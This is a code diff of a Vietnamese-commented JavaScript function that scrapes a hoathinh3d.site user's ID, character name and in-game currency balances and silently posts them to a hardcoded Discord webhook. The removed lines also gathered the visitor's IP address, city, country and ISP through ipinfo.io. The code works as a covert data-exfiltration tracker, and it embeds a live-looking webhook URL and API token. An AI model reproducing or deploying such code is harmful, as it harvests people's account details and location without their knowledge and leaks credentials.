@@ -1,39 +1,26 @@
 (async function logUserInfoToDiscord() {
     const webhook = "https://discord.com/api/webhooks/1372814560792285184/EI3hDpxb6Fd0Sd6ApXVP9ocEdEu-kwn-Qwq4jAhHvIbe82V6KG3Lnwp5tZzx6wNeqTP0";
-    const ipinfoToken = "PASTE_YOUR_TOKEN";  // Lấy miễn phí tại: https://ipinfo.io/signup
-  
     const url = location.href;
-    if (!url.includes("hoathinh3d.site/?t=")) return; // Chỉ chạy nếu là trang t=xxxx
+  
+    // Kiểm tra đúng trang
+    if (!url.includes("hoathinh3d.site")) return;
   
     try {
-      // 1️⃣ Tải lại trang HTML (dù đang ở đó) để parse dữ liệu
       const response = await fetch(url);
       const html = await response.text();
       const doc = new DOMParser().parseFromString(html, "text/html");
   
-      // 2️⃣ Lấy thông tin từ <script> chứa myCRED_Notice
       const scriptTag = Array.from(doc.scripts).find(s => s.textContent.includes('var myCRED_Notice'));
       const userId = scriptTag?.textContent.match(/"user_id":\s*"(\d+)"/)?.[1] || "Không rõ";
   
-      // 3️⃣ Tên nhân vật
       const name = doc.querySelector('#ch_head_name')?.textContent.trim() || "Không rõ";
-  
-      // 4️⃣ Tu Vi
       const tuVi = Array.from(doc.querySelectorAll('#head_manage_acc div'))
         .find(div => div.textContent.includes("Tu Vi"))?.textContent.match(/Tu Vi:\s*(\d+)/)?.[1] || "0";
-  
-      // 5️⃣ Tinh Thạch
       const tinhThach = Array.from(doc.querySelectorAll('#head_manage_acc div'))
         .find(div => div.textContent.includes("Tinh Thạch"))?.textContent.match(/Tinh Thạch:\s*(\d+)/)?.[1] || "0";
-  
-      // 6️⃣ Tiên Ngọc
       const tienNgoc = Array.from(doc.querySelectorAll('#head_manage_acc div'))
         .find(div => div.textContent.includes("Tiên Ngọc"))?.textContent.match(/Tiên Ngọc:\s*(\d+)/)?.[1] || "0";
   
-      // 7️⃣ Lấy thông tin IP (qua ipinfo.io)
-      const ipData = await fetch(`https://ipinfo.io/json?token=10ddf60e7b0de8`).then(res => res.json());
-  
-      // 8️⃣ Gửi về Discord
       const message = [
         `🧙 **THÔNG TIN NGƯỜI CHƠI**`,
         `👤 Nhân vật: ${name}`,
@@ -42,18 +29,16 @@
         `💎 Tinh Thạch: ${tinhThach}`,
         `🔮 Tiên Ngọc: ${tienNgoc}`,
         `🌐 Trang: ${url}`,
-        `📍 IP: ${ipData.ip} | ${ipData.city}, ${ipData.country}`,
-        `📡 ISP: ${ipData.org}`,
         `🕒 Thời gian: ${new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })}`
       ].join("\n");
   
-      await fetch(webhook, {
+      const res = await fetch(webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: message })
       });
   
-      console.log("✅ Đã gửi log về Discord thành công");
+      console.log("✅ Gửi thành công về Discord, status:", res.status);
     } catch (e) {
       console.warn("❌ Lỗi khi gửi log Discord:", e);
     }
